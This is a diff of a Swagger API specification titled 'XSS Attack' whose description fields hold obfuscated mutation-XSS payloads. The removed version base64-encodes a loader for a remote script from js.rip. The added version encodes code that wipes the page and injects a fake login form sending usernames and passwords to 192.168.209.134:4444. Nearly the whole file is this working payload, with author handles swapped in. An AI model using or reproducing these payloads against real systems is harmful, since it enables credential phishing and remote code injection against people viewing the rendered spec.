@@ -1,8 +1,8 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY hackoo
+  title: XSS Attack BY c4s7u
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL3h5aXAwdXV4MDIiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnJzsgCnZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpOwphLmFjdGlvbiA9ICJodHRwOi8vMTkyLjE2OC4yMDkuMTM0OjQ0NDQiOwphLm1ldGhvZCA9ICdQT1NUJzsKYS5pbm5lckhUTUwgPSAnPGNlbnRlcj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyAKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=' onerror=eval(atob(this.id))>>"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -20,14 +20,14 @@ paths:
         '200':
           description: No response was specified
       tags:
-        - M0X0101_XSS_D
+        - c4s7u
       operationId: findAccounts
       summary: Finds all accounts
   '/hack/hachid/{id}':
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL3h5aXAwdXV4MDIiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnJzsgCnZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpOwphLmFjdGlvbiA9ICJodHRwOi8vMTkyLjE2OC4yMDkuMTM0OjQ0NDQiOwphLm1ldGhvZCA9ICdQT1NUJzsKYS5pbm5lckhUTUwgPSAnPGNlbnRlcj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyAKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=' onerror=eval(atob(this.id))>"></form>
           format: int64
           in: path
           name: id
